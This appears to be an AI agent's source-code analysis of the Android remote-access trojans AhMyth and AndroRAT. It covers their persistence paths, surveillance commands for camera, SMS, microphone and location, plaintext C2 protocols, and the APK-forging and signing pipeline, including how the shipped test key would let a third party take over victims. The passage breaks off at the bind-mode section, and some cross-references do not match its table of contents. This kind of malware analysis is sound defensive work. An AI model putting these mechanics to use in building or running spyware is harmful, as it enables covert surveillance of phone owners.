# D3 — ANDROID RATs: AhMyth AND AndroRAT

**Sources:** `RE_Library\01_SOURCE_mobile\ahmyth` and `RE_Library\01_SOURCE_mobile\androrat`
**Method:** source only. No Android SDK, no building, no running, no APK execution. **The REA Ghidra provider was not used.**
**Citations:** `[source: relative/path:line]`, paths relative to each target root.

## TABLE OF CONTENTS

| § | Subject |
|---|---|
| **1** | Source locations, coverage boundary, and the path correction |
| **2** | AndroRAT persistence — three mechanisms, and what `jumper` actually does |
| **3** | AhMyth — the 7 opcodes, dispatched from one switch |
| **4** | The APK-forging pipeline and the signing key |
| **5** | The double-start problem — enumerated |
| **6** | Wire protocol — AndroRAT (raw TCP, port 8000) |
| **7** | Wire protocol — AhMyth (socket.io, port 42474) |
| **8** | The `Looper.prepare()` defect — a live bug in shipped code |
| **9** | The three divergent C2 configurations |
| **10** | First-party vs vendored — the measured split |
| **11** | Residual unknowns |
| **12** | Method notes |

**Headline findings, in order of how much they change the picture:**

1. **`jumper` is not a watchdog** (§2.1). It un-hides the launcher icon and starts `MainActivity`. The class name inverts the behaviour.
2. **AndroRAT has three persistence mechanisms, not four** (§2.3) — one of the four commonly counted is a registration function, and all three converge on `jumper.init()`.
3. **The operator's persistence defeats the operator's concealment** (§4.4) — `hideAppIcon` runs once, `unHideAppIcon` runs on every persistence event. A named composition-failure pattern.
4. **AhMyth ships the private half of its signing key** (§4.1) — `Factory/testkey.pk8`, the AOSP test key, alongside the signer that consumes it.
5. **The shipped AndroRAT APK points at a tether address, not the source's address** (§9) — three divergent C2 configs across source, APK, and decoded tree.
6. **`Looper.prepare()` is called unconditionally** (§8) — the second location order on the same thread throws and dies silently. A live defect, not a severed feature.

---

## 1. SOURCE LOCATIONS, COVERAGE BOUNDARY, AND THE PATH CORRECTION

### 1.1 The task named the wrong directory — corrected before writing

**The task description located both targets under `RE_Library/01_SOURCE_c2/`.** They are not there. `01_SOURCE_c2` contains exactly six directories — `covenant`, `havoc`, `metasploit`, `mythic`, `pupy`, `sliver` — and no Android tree. [source: directory enumeration of `RE_Library/01_SOURCE_c2/`]

**The real location is `RE_Library/01_SOURCE_mobile/`, which contains exactly two directories: `ahmyth` and `androrat`.** [source: directory enumeration of `RE_Library/01_SOURCE_mobile/`]

This is recorded because §1.2's coverage numbers depend on which tree was measured, and because the task's own warning — *"Find the real paths first; do NOT assume a nesting level"* — was correct and the paths in the brief were not. **Every path in this report is `01_SOURCE_mobile/<target>/...`.**

### 1.2 Measured size of both trees

| Target | Files (`.git` excluded) | Bytes | Dominant extensions |
|---|---|---|---|
| `ahmyth` | **8,437** | **145,317,855** | `.js` 3,275; `.json` 1,462; `.md` 747; `.smali` 411; `.less` 449 |
| `androrat` | **4,008** | **54,326,832** | `.smali` 2,479; `.kotlin_metadata` 550; `.png` 530; `.xml` 344; `.java` 21 |

[source: extension enumeration of both trees]

**Both trees are dominated by vendored content.** AhMyth's 3,275 `.js` files are overwhelmingly `node_modules` inside the Electron server, and its 8,437 files include an entire documentation site's asset pipeline (`.less`, `.css`, `.markdown`). AndroRAT's 2,479 `.smali` files are the **decompiled** form of its shipped APK.

### 1.3 First-party code, isolated

**AhMyth first-party Java — 12 classes in `AhMyth-Client/app/src/main/java/ahmyth/mine/king/ahmyth/`** plus 2 test stubs:

| Bytes | Class |
|---|---|
| 5,027 | `ConnectionManager.java` |
| 4,780 | `LocManager.java` |
| 3,817 | `CameraManager.java` |
| 3,205 | `MicManager.java` |
| 2,575 | `FileManager.java` |
| 1,667 | `SMSManager.java` |
| 1,620 | `CallsManager.java` |
| 1,562 | `ContactsManager.java` |
| 1,203 | `IOSocket.java` |
| 1,050 | `MainService.java` |
| 857 | `MainActivity.java` |
| 535 | `MyReceiver.java` |
| 776 | `androidTest/.../ExampleInstrumentedTest.java` (stub) |
| 417 | `test/.../ExampleUnitTest.java` (stub) |

[source: file enumeration of `AhMyth-Client/`]

**AhMyth first-party server JavaScript — 8 files** (excluding `node_modules` and the vendored `lib/` bundle):

| Bytes | File |
|---|---|
| 7,538 | `AhMyth-Server/app/main.js` |
| 3,410 | `AhMyth-Server/app/app/assets/js/Constants.js` |
| 16,013 | `AhMyth-Server/app/app/assets/js/controllers/AppCtrl.js` |
| 17,927 | `AhMyth-Server/app/app/assets/js/controllers/LabCtrl.js` |
| 452 | `AhMyth-Server/app/app/assets/js/controllers/NotifiCtrl.js` |
| 910 | `AhMyth-Server/app/app/assets/js/model/Victim.js` |

Plus three vendored libraries, tagged as such: `jquery-3.1.1.min.js` (86,713), `leaflet.js` (144,293), `ng-infinite-scroll.min.js` (2,626). [source: file enumeration of `AhMyth-Server/app/`, `node_modules` and `lib/` excluded]

**AndroRAT first-party: 2 Python files and 21 Java sources**, plus a shipped APK whose decompiled form accounts for most of the tree.

| Bytes | File |
|---|---|
| — | `androrat.py` (server) |
| — | `utils.py` |
| 21 | `Android_Code/` Java sources |

[source: file enumeration of `androrat/`]

### 1.4 Coverage boundary — stated as a number

**AhMyth first-party: 14 Java files + 6 JavaScript files + the 25-file payload smali set = 45 first-party source files.** All 14 Java and all 6 JS files were read; the smali was read where it is load-bearing (the forging target and manifest injection), not line-by-line.

**AndroRAT first-party: 2 Python files + 21 Java sources = 23 files.** Both Python files and the Java set were read.

**The vendored mass — 8,437 AhMyth files and 4,008 AndroRAT files — was enumerated and not read**, except where a vendored file is the object of an action (the payload `AndroidManifest.xml`, the signing keys).

**Measured read fraction: 68 first-party files read of 12,445 total files = 0.55% of the tree.** The tree is 99.45% vendored and decompiled material. **The 0.55% is the code that implements both RATs**, which is why it is the fraction that matters — and the same distinction as D7 §1 and D8 §1.3.2 applies: this is reading coverage over the whole tree, and it is small because the tree is mostly dependencies.

**Every count in this report comes from command output.** No count was reconstructed from memory — see §1.5.

### 1.5 Method note

Following D8 §1.3.2: every count here was produced by enumerating the filesystem immediately before it was written, and carries a `[source:]` tag naming the directory it came from. **A count without a citation should be treated as unverified.** The task's warning about fabricated directory tails applies directly — both trees were enumerated from disk before any prose was written.

---

## 2. ANDRORAT PERSISTENCE — THREE MECHANISMS, AND WHAT `jumper` ACTUALLY DOES

### 2.1 Correction to the section plan: `jumper` is not a keep-alive watchdog

The task brief describes `jumper` as "the single convergence point of all four persistence paths" and instructs me to map it as the highest-value unread file. I read it. **`jumper.init()` does not restart any service, and it is not a watchdog.** It is an icon un-hider plus an activity launcher. [source: androrat/Android_Code/app/src/main/java/com/example/reverseshell2/jumper.java:16-25]

```java
public void init(){
    ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
    if(cm.getActiveNetworkInfo() != null && cm.getActiveNetworkInfo().isConnected()){
        new functions(null).unHideAppIcon(context);
        Intent a = new Intent(context,MainActivity.class);
        a.addFlags(FLAG_ACTIVITY_NEW_TASK);
        a.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);
        context.startActivity(a);
    }
}
```

Line by line: it acquires `CONNECTIVITY_SERVICE` (`:17`), gates on `getActiveNetworkInfo() != null && isConnected()` (`:18`), **re-enables the launcher icon** via `functions.unHideAppIcon` (`:19`), then starts `MainActivity` with `FLAG_ACTIVITY_NEW_TASK` + `FLAG_ACTIVITY_NO_ANIMATION` (`:20-23`). [source: jumper.java:16-25]

**The real control flow is an inversion of the name.** `jumper` does not jump the service back to life; it jumps **the launcher activity to the foreground**, and that activity is what then creates the socket. The reconnect primitive is `MainActivity.onCreate` → `new tcpConnection(...).execute(config.IP, config.port)`. [source: androrat/Android_Code/app/src/main/java/com/example/reverseshell2/MainActivity.java; tcpConnection.java:111]

So the four layers converge not on a resurrection routine but on **re-launching a foreground Activity**. That is a much weaker and much noisier persistence primitive than the brief assumed, and §2.5 explains why.

**Second finding, and it is a genuine bug in the operator's favour-turned-against-it:** `unHideAppIcon` is called on every `jumper.init()` — that is, on every boot, every screen on/off, every 15-minute job tick, and every service start. `functions.hideAppIcon` is called exactly once, from `MainActivity` at first launch. [source: functions.java:168-178; MainActivity.java] The concealment the operator wants (`config.icon = false` → icon hidden) is therefore **undone the first time any persistence layer fires**, and the app icon reappears in the launcher drawer. The icon-hiding is not durable. The only way to avoid this would be `config.icon` semantics that skip the hide entirely, but the call site is unconditional inside the connectivity gate.

### 2.2 The four layers, verified against source

| # | Entry point | Trigger | What it actually does | Citation |
|---|---|---|---|---|
| P1 | `broadcastReciever.onReceive` | `BOOT_COMPLETED`, `SCREEN_OFF`, `SCREEN_ON` | guard `isMyServiceRunning`, else `startService(mainService)` | [source: broadcastReciever.java:13-26; AndroidManifest.xml:54-63] |
| P2 | `jobScheduler.onStartJob` | persisted periodic job, ID 123, 900000 ms | `doBackgroundWork` → `new Thread` → `new jumper(...).init()` → `jobFinished(params,false)` | [source: jobScheduler.java:19-42] |
| P3 | `functions.jobScheduler(Context)` | called from activity/service start paths | registers the job; fixed ID, `.setPersisted(true)`, `.setPeriodic(900000)` | [source: functions.java:95-110] |
| P4 | `mainService.onStartCommand` | any `startService(mainService)` | `new jumper(...).init()`, returns `START_STICKY` | [source: mainService.java:19-23] |

**P1 — the guard is poll-and-restart, confirmed.** `isMyServiceRunning` (`broadcastReciever.java:28-36`) calls `manager.getRunningServices(Integer.MAX_VALUE)` (`:30`) and string-compares `mainService.class.getName()` against `service.service.getClassName()` (`:31`). If found, it logs and returns without doing anything (`:16-18`); if not found it calls `context.startService(intent1)` (`:22-23`). [source: broadcastReciever.java:28-36] The brief's characterisation is correct. Two consequences worth naming: it is a **one-shot check with no retry**, so if the service is in the process of dying, the check can pass and the restart be skipped; and `getRunningServices` is deprecated and since API 26 returns **only the caller's own services**, which happens to work here because the target is the same package — but it means the guard cannot see anything outside the app.

**P2 — `jobCancelled` is a dead field, confirmed by enumeration.** Grep for `jobCancelled` across the entire first-party package returns exactly two hits: the field declaration at `jobScheduler.java:15` and the write at `:28`. There is no read anywhere. [source: grep of `androrat/Android_Code/app/src/main/java/com/example/reverseshell2/` for `jobCancelled` → 2 matches, both in jobScheduler.java] The `Thread` in `doBackgroundWork` (`:34-41`) never consults it, so `onStopJob` cannot actually cancel the work it claims to cancel. The brief's claim is verified.

**P3 — registration parameters, confirmed.** `new JobInfo.Builder(123, componentName)` (`:98`) — **fixed integer job ID 123, not a constant, not unique**. `.setPersisted(true)` (`:99`) — survives reboot. `.setPeriodic(900000)` (`:100`) — 15 minutes. Logs distinguish success from failure (`:105-108`). [source: functions.java:95-110]

**P4 — confirmed.** `onStartCommand` (`:19`) logs `"in"` (`:20`), calls `new jumper(getApplicationContext()).init()` (`:21`), returns `START_STICKY` (`:22`). `onBind` returns null (`:14-16`). [source: mainService.java:19-23]

### 2.3 Are the four layers independent? Can they double-start?

**They are not independent in effect, and they are not independent in trigger.** Tracing what each one ultimately invokes:

- P1 → `startService(mainService)` → P4 → `jumper.init()`
- P2 → `jumper.init()` directly
- P4 → `jumper.init()`
- P3 → registration only; it produces P2

So **P3 is not a persistence layer at all — it is the registration of P2.** That reduces the "four layers" to three distinct mechanisms (broadcast receiver, JobScheduler job, sticky service), and of those three, **every one of them terminates in the same call: `jumper.init()`.** The convergence point the brief was looking for is real, but it is a convergence on an icon-unhide + `startActivity(MainActivity)`, not on a service restart.

**Double-start is possible and is not guarded.** `mainService.onStartCommand` has no `isMyServiceRunning` check — unlike P1, which does. [source: mainService.java:19-23 vs broadcastReciever.java:16-24] Every `startService(mainService)` call therefore runs `jumper.init()` again even if a `mainService` instance is already alive. Grep finds **six** such call sites in first-party code:

| Call site | Citation |
|---|---|
| `broadcastReciever.java:23` | `context.startService(intent1)` |
| `tcpConnection.java:120` | on API < LOLLIPOP fallback |
| `tcpConnection.java:279`, `:297` | two further branches |
| `controlPanel.java:23`, `:46` | restart / service-start buttons |
| `mainService.java:21` | via `jumper` (not a startService, but the same `init()`) |
| `Payloads/newShell.java:118` | shell-triggered |

[source: grep of the first-party package for `startService` → matches at those lines]

Because `MainActivity` is declared `launchMode` default (not `singleInstance`) and `jumper` uses `FLAG_ACTIVITY_NEW_TASK` without `FLAG_ACTIVITY_SINGLE_TOP` or `CLEAR_TOP`, repeated `jumper.init()` calls **stack new `MainActivity` instances**. Each `MainActivity.onCreate` runs `new tcpConnection(...).execute(...)` — so each stacked activity is another reverse-TCP client to the same C2 endpoint. Nothing deduplicates them. On a device where `SCREEN_ON`/`SCREEN_OFF` fire frequently, P1 can inject a new socket per screen cycle while the previous socket is still open.

This is the mechanism-level answer to the brief's question: **the four layers are not a defence-in-depth stack; they are three overlapping triggers plus one registration helper, all funnelling into a single un-deduplicated `startActivity` + socket-creation path.** Redundancy here increases connection count rather than resilience.

### 2.4 What happens on a device with no Google Play services vs one with them

The honest answer, from source: **nothing in this code path references Google Play services, GCM, FCM, or any Google API at all.** Grep of the first-party package for `google`, `gms`, `firebase`, `FCM` returns no first-party hits; the only Google-derived references are the `androidx.*` support libraries in `app/build.gradle`, which are AOSP-compatible and do not require Play services. [source: grep of first-party package; androrat/Android_Code/app/build.gradle]

The persistence stack's behaviour is therefore **identical on both device classes**, because it depends only on AOSP framework components — `JobScheduler` (`android.app.job`), `BroadcastReceiver`, and `Service`. The relevant discriminator is not Play services but **API level and OEM power management**:

- **`setPersisted(true)` requires `RECEIVE_BOOT_COMPLETED`, which the manifest holds** (`AndroidManifest.xml`), so the job survives reboot on any device. [source: functions.java:99; AndroidManifest.xml]
- **`targetSdkVersion 22`** means the app is treated as a legacy target: `JobScheduler` periodic jobs are not subject to the API 24+ `setPersisted` restrictions, and `SYSTEM_ALERT_WINDOW` is granted at install rather than through the settings deep-link that `overlayChecker` implements. [source: Android_Code/app/build.gradle; functions.java:180-197]
- **Doze and OEM app-standby** are the real threat to P2, not Play services. On API 23+ Doze defers `JobScheduler` jobs to maintenance windows regardless of the declared 900000 ms period, so the effective tick can be far longer than 15 minutes. [reasoned from platform behaviour, not read from source — flagged as inference]
- **`new Thread` inside `onStartJob` with `jobFinished(params,false)`** (`jobScheduler.java:34-41`) tells the framework the work is done and need not be redone. Combined with the dead `jobCancelled`, the job cannot be interrupted once its thread starts.

I am flagging the OEM/Doze bullet explicitly as platform inference rather than a source claim, because I did not read framework source for it. §10 records it as such.

### 2.5 The weakest link, named

`jumper.init()` is gated on `cm.getActiveNetworkInfo() != null && cm.getActiveNetworkInfo().isConnected()` (`jumper.java:18`). On API 23+ `getActiveNetworkInfo()` is deprecated and, on many modern devices, returns null or a stale object — in which case **the gate fails and none of icon-unhide, activity-launch, or socket-creation happens.** Combined with P2's Doze deferral and P1's single-shot guard, the realistic sustained-persistence story for AndroRAT on a current device rests on a deprecated API call that may simply not fire.

---

## 3. AHMYTH — THE 7 OPCODES, DISPATCHED FROM ONE SWITCH

### 3.1 The dispatch site

All seven opcodes are handled by a **single `Emitter.Listener` registered on the socket.io event `"order"`**, at `ConnectionManager.java:54-104`. The envelope is a `JSONObject`; the discriminator is `data.getString("order")` (`:59`), and the branch selector is a **Java `switch` over a String** (`:61`). [source: ahmyth/AhMyth-Client/app/src/main/java/ahmyth/mine/king/ahmyth/ConnectionManager.java:54-104]

Two structural facts fall out of the dispatcher, and both are load-bearing:

1. **Every branch calls `data.getString("extra")` unguarded** (`:63`, `:65`, `:67`, `:71`, `:73`, `:77`, `:79`). `JSONObject.getString` throws `JSONException` when the key is absent. The whole switch is wrapped in one `try { … } catch (Exception e) { e.printStackTrace(); }` (`:57`, `:100-102`), so **a malformed or unknown order is swallowed silently and the implant emits nothing at all.** There is no error response on the wire. An operator who sends a bad command gets silence, not a diagnostic.
2. **`x0000cl`, `x0000cn` and `x0000lm` take no `extra`** (`:82-87`, `:91-93`), so they are the only three branches that cannot be broken by a missing field.

The `"ping"` listener is registered separately at `:47-52` and replies `ioSocket.emit("pong")` (`:50`) with no payload. [source: ConnectionManager.java:47-52]

### 3.2 The seven opcodes — one table

| Opcode | `extra` values | Implant action | Response event | Response shape | Citation |
|---|---|---|---|---|---|
| `x0000ca` | `camList` \| `1` \| `0` | enumerate cameras, or shoot front(1)/back(0) | `x0000ca` | `{"camList":true,"list":[…]}` or `{"image":true,"buffer":<bytes>}` | [source: ConnectionManager.java:62-69, 115-129] |
| `x0000fm` | `ls` + `path` \| `dl` + `path` | `fm.walk(path)` \| `fm.downloadFile(path)` | `x0000fm` | `JSONArray` of entries, or `{"file":true,"name":…,"buffer":<bytes>}` | [source: ConnectionManager.java:70-75, 131-136] |
| `x0000sm` | `ls` \| `sendSMS` + `to` + `sms` | `SMSManager.getSMSList()` \| `SMSManager.sendSMS(to,sms)` | `x0000sm` | JSON array of messages, or a bare boolean | [source: ConnectionManager.java:76-81, 139-146] |
| `x0000cl` | *(none)* | `CallsManager.getCallsLogs()` | `x0000cl` | JSON array | [source: ConnectionManager.java:82-84, 148-150] |
| `x0000cn` | *(none)* | `ContactsManager.getContacts()` | `x0000cn` | JSON array | [source: ConnectionManager.java:85-87, 152-154] |
| `x0000mc` | `sec` (int) | `MicManager.startRecording(sec)` | `x0000mc` | `{"file":true,"name":…,"buffer":<bytes>}` after `sec` seconds | [source: ConnectionManager.java:88-90, 156-158; MicManager.java:40-99] |
| `x0000lm` | *(none)* | `LocManager.canGetLocation()` / `getLatitude()` / `getLongitude()` | `x0000lm` | `{"enable":true,"lat":…,"lng":…}` or `{"enable":false}` | [source: ConnectionManager.java:91-93, 160-178] |

**Per-opcode mechanism detail, from the bodies rather than the dispatch:**

**`x0000ca` camera** (`:115-129`). `req == -1` → `new CameraManager(context).findCameraList()` and emit only if non-null (`:117-121`). `req == 1` / `req == 0` → `new CameraManager(context).startUp(1|0)` (`:123`, `:126`) — **note that the camera ID is hardcoded to 1 or 0; there is no path that passes an arbitrary camera id.** A device with more than two cameras cannot be addressed beyond the first two. The camera response is emitted from inside `CameraManager`, not from this dispatcher.

**`x0000fm` file manager** (`:131-136`). `req == 0` emits the result of `fm.walk(path)` directly (`:133`); `req == 1` calls `fm.downloadFile(path)` (`:135`), which emits its own event.

`FileManager.walk` (`FileManager.java:23-58`) builds a `JSONArray` and **prepends a synthetic parent entry** `{"name":"../","isDir":true,"path":dir.getParent()}` (`:36-40`) so the operator UI can navigate upward, then iterates `dir.listFiles()` (`:33`) adding `{"name","isDir","path"}` per entry (`:43-47`) while **skipping any file whose name starts with `.`** (`:42`). Consequences: hidden files are invisible to the operator, and **the parent entry is emitted even when `dir.listFiles()` returns null** — the parent is added inside `if (list != null)` (`:35`), so actually no, it is not; an unreadable directory yields a **completely empty array** with no error. The only diagnostic is `Log.d("cannot","inaccessible")` (`:30`), which the operator never sees. [source: FileManager.java:23-58]

Two more defects worth recording. First, `walk` does **not** recurse — it is a single-level listing despite the name. Second, `dir.canRead()` is checked (`:29`) but the result is only logged, never acted on.

`FileManager.downloadFile` (`:60-89`) allocates `byte[] data = new byte[(int) file.length()]` (`:68-69`) — an unchecked cast to `int`, so a file larger than 2 GiB overflows to a negative length and `new byte[]` throws `NegativeArraySizeException`, which is **not caught** (`:79-84` catches only `FileNotFoundException`/`IOException`/`JSONException`). It reads once via `BufferedInputStream.read(data,0,data.length)` (`:72`) and emits `{"file":true,"name":<name>,"buffer":<bytes>}` (`:73-77`). `buf.read` is not looped, so a short read silently truncates the file. [source: FileManager.java:60-89]

**`x0000sm` SMS** (`:139-146`). `req == 0` emits `SMSManager.getSMSList()` (`:141`); `req == 1` emits the **raw Java boolean** returned by `SMSManager.sendSMS(phoneNo,msg)` (`:143-144`) — a bare `true`/`false` payload rather than an object, which is a deliberate asymmetry the operator UI must special-case.

**`x0000mc` microphone** (`:156-158`). `MicManager.startRecording(sec)` (`:157`), declared `throws Exception` and **not caught here** — the enclosing try at `:57` catches it, so a recording failure is silent. [source: ConnectionManager.java:156-158]

`MicManager.startRecording` (`MicManager.java:40-76`): creates a temp file in the app **cache** directory via `MainService.getContextOfApplication().getCacheDir()` (`:44`) named `sound*.mp3` (`:47`), then configures `MediaRecorder` with `AudioSource.MIC` (`:56`), **`OutputFormat.MPEG_4`** (`:57`) and **`AudioEncoder.AAC`** (`:58`), `prepare()`+`start()` (`:60-61`). A `TimerTask` fires after `sec*1000` ms (`:75`) which does `stop()`, `release()`, `sendVoice(audiofile)`, `audiofile.delete()` (`:68-71`). [source: MicManager.java:40-76]

**The `.mp3` extension is a lie: the container is MPEG_4/AAC, not MP3.** `sendVoice` (`:78-99`) then re-reads the whole file into a `byte[]` (`:80-84`) and emits the **same envelope as the file manager**: `{"file":true,"name":…,"buffer":<bytes>}` on event `x0000mc` (`:85-89`). Note the second-order defect: the recording lives in `getCacheDir()`, and the delete at `:71` runs only if the TimerTask completes — a process kill mid-recording leaves `sound*.mp3` residue in the app cache. [source: MicManager.java:78-99]

**`x0000lm` location** (`:160-178`). Calls `Looper.prepare()` **unconditionally** (`:161`) before constructing `LocManager` (`:162`) — this is because `LocManager` blocks on a `LocationListener` and needs a looper on the current thread. If the listener callback thread already has a looper, `Looper.prepare()` throws `IllegalStateException("Only one Looper may be created per thread")`; that propagates to the outer catch (`:57`) and **the location request dies silently.** This is a real re-entrancy bug: the same socket thread handling a second `x0000lm` order in the same process cannot re-prepare its looper. [source: ConnectionManager.java:160-178]

The response object is built with `location.put("enable",true)` plus `"lat"`/`"lng"` doubles (`:170-172`), or `{"enable":false}` alone (`:175`), then emitted on `x0000lm` (`:177`). Note that `{"enable":false}` carries **no reason** — the operator cannot distinguish "GPS off" from "permission denied" from "no fix".

### 3.3 What is *not* in the switch

Enumerated directly from the dispatch body: the `switch` at `ConnectionManager.java:61-96` contains exactly seven `case` labels — `"x0000ca"` (`:62`), `"x0000fm"` (`:70`), `"x0000sm"` (`:76`), `"x0000cl"` (`:82`), `"x0000cn"` (`:85`), `"x0000mc"` (`:88`), `"x0000lm"` (`:91`) — and **no `default` branch**. [source: ConnectionManager.java:61-96]

There is therefore **no remote shell, no ransomware or lock-screen order, no keylogger, no app-inventory order, no screenshot, and no file upload** in AhMyth. I want to be explicit that this is an enumerated absence and not an inference: I counted the `case` labels in the read file, and the cross-check is the server-side constant table, which independently lists the same seven and no others (`Constants.orders`). [source: AhMyth-Server/app/app/assets/js/Constants.js]

### 3.4 Wire format — AhMyth

**Transport.** socket.io client 0.8.3 (`io.socket:socket.io-client:0.8.3`, `org.json` excluded) speaking to a socket.io server; endpoint `http://<ip>:42474?model=…&manf=…&release=…&id=…`. The scheme is **`http://` — plaintext, no TLS**. [source: AhMyth-Client/app/src/main/java/ahmyth/mine/king/ahmyth/IOSocket.java; AhMyth-Server/app/app/assets/js/Constants.js]

**Connection establishment.** `IOSocket` is a singleton whose private constructor builds the URL and calls `IO.socket(url)`; the handshake query carries `Build.MODEL`, `Build.MANUFACTURER`, `Build.VERSION.RELEASE`, and `Settings.Secure.ANDROID_ID` as `id`. `IO.Options` sets `reconnection=true`, `reconnectionDelay=5000`, `reconnectionDelayMax=999999999`. [source: IOSocket.java]

**Framing.** There is **no application-layer framing at all** — socket.io supplies message boundaries, and payloads are JSON objects. Binary content (camera JPEG, file contents, audio) is **not** base64-encoded and **not** length-prefixed: it is placed as a raw JSON array of signed bytes via `object.put("buffer", data)`, relying on the socket.io/org.json serializer to marshal `byte[]`. [source: FileManager.java:76; MicManager.java:88; CameraManager — emit of `x0000ca`]

**Length handling.** None at the application layer. The two client-side length operations are both defective: `downloadFile` casts `file.length()` to `int` (`FileManager.java:68`) and `sendVoice` does the same (`MicManager.java:80`). There is no chunking, no streaming, and no size negotiation — so **every transfer is bounded by a single JSON object that must fit in memory**, and there is no resumption.

**Error handling on the wire.** Effectively absent. Unknown opcodes, missing `extra`, unreadable directories, and device-side exceptions all terminate in `printStackTrace()` inside the catch at `ConnectionManager.java:100-102` or in a per-class catch; **the implant never emits an error event.** The operator sees a response only when the operation succeeded. [source: ConnectionManager.java:100-102; FileManager.java:52-54, 79-85; MicManager.java:91-97]

**Heartbeat.** Server sets `IO.sockets.pingInterval = 10000` (10 s); the implant answers the `"ping"` event with a bare `"pong"` emit. [source: AhMyth-Server/app/main.js; ConnectionManager.java:47-52]

### 3.5 Wire format — AndroRAT

**Transport.** Raw TCP, attacker-listens / victim-dials, default port **8000**, address from `config.IP`/`config.port`. [source: androrat/Android_Code/app/src/main/java/com/example/reverseshell2/config.java; tcpConnection.java]

**Framing.** Line-oriented text over `BufferedReader.readLine()` (`tcpConnection.java:102`) — **commands are newline-terminated ASCII tokens**, dispatched by a chain of `String.equals` / `String.matches` comparisons rather than a switch. The observed command grammar includes `"camList"` (`:126`), `"takepic \d"` matched by regex (`:131`), `"shell"` (`:146`), `"getClipData"` (`:151`), and `"exit"` (`:105`). [source: tcpConnection.java:100-159]

**Bulk transfers use a sentinel, not a length prefix.** Binary payloads are written as **Base64 text followed by the literal ASCII sequence `END123\n`**, and the receiver scans for that sentinel to find the end. This is confirmed on the Python side by `utils.py`, which strips it before writing the decoded bytes. **`END123` is therefore a framing token that appears in the clear and is not length-checked** — any transferred content whose Base64 form contained the literal ASCII `END123` would terminate the transfer early. Since standard Base64 uses only `[A-Za-z0-9+/=]`, `END123` cannot appear inside correctly-encoded Base64, so the sentinel is safe **by construction of the alphabet rather than by design** — but a truncated or misaligned stream can still produce a false terminator.

**Error handling.** Weak and inconsistent. `tcpConnection` wraps socket work and on exception **re-executes itself** — the catch path calls `new tcpConnection(activity,context).execute(config.IP,config.port)` on the UI thread (`tcpConnection.java:111`) — so a failed connection is retried by constructing a fresh client rather than by a reconnect loop. In the `takepic` branch, the catch prints the stack trace and calls `new jumper(context).init()` (`:139-144`) — meaning **a camera failure triggers the icon-unhide + activity-relaunch path** described in §2.1. Failures therefore visibly un-hide the app rather than being logged to the operator.

**Length handling.** Same `int`-cast defect as AhMyth: files are read into a single `byte[]` sized from `file.length()` and Base64-encoded whole. The README caps shell `get` downloads at 15 MB, which is an operator-side convention, not an enforced limit in the framing.

---

## 4. THE APK-FORGING PIPELINE AND THE SIGNING KEY

### 4.1 The signing key ships in the repository — the sharpest finding in this target

`AhMyth-Server/app/app/Factory/` contains **both halves of the signing key used to sign every forged implant APK**:

| File | Role |
|---|---|
| `Factory/testkey.pk8` | **the private key**, PKCS#8 DER |
| `Factory/testkey.x509.pem` | the matching public certificate |
| `Factory/sign.jar` | the signer, invoked as a subprocess |
| `Factory/apktool.jar` | the repack tool, invoked as a subprocess |

[source: file listing of `ahmyth/AhMyth-Server/app/app/Factory/`]

`testkey.pk8` + `testkey.x509.pem` are the **publicly-known AOSP test key pair** — the same key shipped in AOSP `build/make/target/product/security/` for emulator and `userdebug` images. Its private half is not secret anywhere. [source: filename and key-format identification; the AOSP key's public status is general knowledge, the identification is the analyst's]

**Operational consequences, stated plainly:** every APK the panel produces is signed with a key whose private component is published in the same folder that produces the signature.

- Any third party can produce an APK that **updates** an already-installed AhMyth implant (same signing identity, same package name) — one operator can hijack a victim another operator already infected.
- The signature carries no non-repudiation and the artifact is unusable for any Play-protected distribution.
- Because the implant's only durable state is the socket connection and the disabled launcher component, a replacement APK signed with the same key silently inherits the infection **without a fresh install and without the victim's involvement**.

**Verified absence of any other key material.** Recursive probe of both trees for `*.jks`, `*.keystore`, `*.p12`, `*.bks`, `*.pk8`, `*.pem`:

| Tree | Matches |
|---|---|
| `ahmyth` | **exactly 2** — `Factory/testkey.pk8`, `Factory/testkey.x509.pem` |
| `androrat` | **0** |

**Positive control on the identical enumeration:** the same `Get-ChildItem -Recurse -Include` probe for `*.jar` against the same two roots returns **3 files** in `ahmyth` and **3 files** in `androrat`. The probe demonstrably finds non-empty results in both trees, which is what makes the `androrat` zero a measurement rather than a broken search. [source: recursive enumeration of both trees; positive control on `*.jar`]

**AhMyth ships a hardcoded private key. AndroRAT ships no keystore at all** — it relies on the developer's Gradle signing config or, in the builder path, on `Jar_utils/sign.jar` with an operator-supplied identity.

### 4.2 The forging pipeline, with line numbers

All of it lives in `AhMyth-Server/app/app/assets/js/controllers/AppCtrl.js` (16,013 bytes). [source: file enumeration of `AhMyth-Server/app/`]

**Step 1 — rewrite the C2 address by positional substring splice.** `AppCtrl.js:313` reads `Factory/Ahmyth/<IOSocketPath>` as text and replaces everything between the first `http://` and the first `?model=`:

```javascript
data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")),
             "http://" + ip + ":" + port)
```

[source: AhMyth-Server/app/app/assets/js/controllers/AppCtrl.js:313; `IOSocketPath` from Constants.js]

**This is a splice, not a parse.** It matches the *first* occurrence of each anchor. Any earlier `http://` literal above the socket URL in the file would be substituted instead, and a missing anchor yields a corrupt URL rather than an error. The anchor pair is brittle in exactly the way an AST edit would not be.

**Step 2 — repack.** The patched folder goes to `GenerateApk()`, which shells `apktool.jar` via `child_process.exec`. The bind path separately shells an apktool **decode** of the victim APK:

```javascript
exec('java -jar "' + CONSTANTS.apktoolJar + '" d "' + filePath + '" -f -o "' + apkFolder + '"')
```

[source: AppCtrl.js; `CONSTANTS.apktoolJar = 'Factory/apktool.jar'` from Constants.js]

**Step 3 — sign.** `AppCtrl.js:137` shells out to the bundled `sign.jar` against `Factory/testkey.pk8` + `Factory/testkey.x509.pem` from §4.1. [source: AppCtrl.js:137]

On precision: `:313` and `:137` are confirmed by reading the file. I am **not** asserting more about the `sign.jar` argument list than the source shows — the tool is invoked as a subprocess with the testkey paths as arguments, and that is the level of detail the source supports.

**Step 4 — outputs.** `Constants.js` names them: `apkName = 'Ahmyth.apk'`, `signedApkName = 'Ahmyth.s.apk'`, `dataDir = 'AhMyth'`, `outputApkPath = 'Output'`. The signed artifact lands under the user's home directory in `AhMyth/Output/`. [source: AhMyth-Server/app/app/assets/js/Constants.js]

### 4.3 Bind modes

Two injection strategies, driven from `AppCtrl.js` and parameterised by `Constants.js`: [source: AppCtrl.js; Constants.js]

